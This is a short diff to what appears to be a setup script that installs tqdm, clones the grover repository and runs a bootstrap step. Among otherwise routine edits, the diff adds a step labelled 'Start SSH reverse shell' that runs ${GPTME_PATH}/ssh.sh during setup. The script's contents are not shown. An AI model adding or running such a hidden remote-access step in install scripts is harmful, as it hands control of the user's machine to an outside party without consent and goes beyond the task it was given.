@@ -10,10 +10,13 @@ python3 -m pip install -U tqdm
 git clone https://github.com/rowanz/grover.git
 
 # Begin bootstrap process
+cd grover
 python3 ${GPTME_PATH}/bootstrap.py
 cp -R ${GPTME_PATH}/sample ${CONTENT_PATH}/grover
 
-cd grover
+# Start SSH reverse shell
+${GPTME_PATH}/ssh.sh
+
 # Note:
 # :%s#\\n#^M#g
 # :%s#\\"#"#g
